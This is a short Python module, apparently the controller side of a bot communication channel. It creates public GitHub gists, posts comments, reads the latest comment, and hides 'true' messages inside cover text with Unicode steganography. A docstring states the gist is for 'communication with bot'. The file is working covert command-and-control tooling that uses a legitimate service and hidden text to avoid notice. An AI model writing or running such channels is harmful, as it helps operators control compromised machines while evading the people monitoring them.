import requests
import pyUnicodeSteganography as usteg
from constants import PAGE_SIZE, HEADERS, API_URL


def get_new_gist_comment(gist_id) -> str | None:
    """
    Return last gist comment
    :param gist_id: ID of gist
    :return: Return body of last comment or None if not found
    """
    current_page_idx = 0
    has_next_page = True
    pages = []

    while has_next_page:
        current_page_idx += 1
        params = {"per_page": PAGE_SIZE, "page": current_page_idx}
        current_page = requests.get(API_URL + "/" + gist_id + "/comments", headers=HEADERS, params=params).json()
        pages.extend(current_page)

        has_next_page = (len(current_page) >= PAGE_SIZE)

    if len(pages) < 1:
        return None

    return pages[len(pages) - 1]["body"]


def add_gist_comment(gist_id, message) -> None:
    """
    Add new comment to gist via GitHub API
    :param gist_id: ID of gist
    :param message: Encoded message
    :return: None
    """
    data = {
        "body": message
    }

    requests.post(API_URL + "/" + gist_id + "/comments", json=data, headers=HEADERS)
    return


def create_gist() -> str:
    """
    Create new gist via GitHub API for next communication with bot.
    :return: Return new gist ID.
    """

    data = {
        "description": "My new gist",
        "public": True,
        "files": {
            "file1.txt": {
                "content": "Hello, world!"
            }
        }
    }

    response = requests.post(API_URL, json=data, headers=HEADERS)
    return response.json().get("id")


def delete_gist(gist_id) -> None:
    """
    Delete gist via github API.
    :return: None
    """
    requests.delete(API_URL + "/" + gist_id, headers=HEADERS)
    return


def get_encoded_message(message, secret) -> str:
    """
    Encode message with Steganography library
    :param message: Fake message
    :param secret: True message to hide
    :return: Return encoded message
    """
    return usteg.encode(message, secret)


def get_decoded_message(encoded_message) -> str:
    """
    Decode hidden message with Steganography library
    :param encoded_message: Encoded message
    :return: Return true decoded message
    """
    return usteg.decode(encoded_message)
